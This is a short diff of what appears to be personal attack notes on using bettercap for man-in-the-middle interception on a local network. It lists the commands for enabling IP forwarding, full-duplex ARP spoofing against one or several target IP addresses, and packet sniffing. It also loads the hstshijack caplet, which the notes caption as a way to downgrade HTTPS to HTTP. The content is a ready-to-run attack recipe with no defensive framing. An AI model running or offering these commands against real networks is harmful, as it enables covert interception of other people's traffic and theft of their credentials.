@@ -72,20 +72,22 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 
 -> ARP Spoofing with bettercap
-traget=192.168.20.130 "Target station
-"install hstshijack caplets"
 
 bettercap -iface <interface>
 net.probe on
 
 set arp.spoof fullduplex true
-set arp.spoof fullduplex targets $target1
+set arp.spoof fullduplex targets 192.168.1.2
 "Multiple target"
-"set arp.spoof fullduplex targets $target1, $target2, $target3 ..."
+"set arp.spoof fullduplex targets 192.168.1.2, 192.168.1.3, 192.168.1.4 ..."
 arp.spoof on
 
 "For downgrade HTTPS to HTTP"
 set net.sniff.local true
 net.sniff on
+
+caplets.update
+caplets.show
+hstshijack/hstshijack
 
 
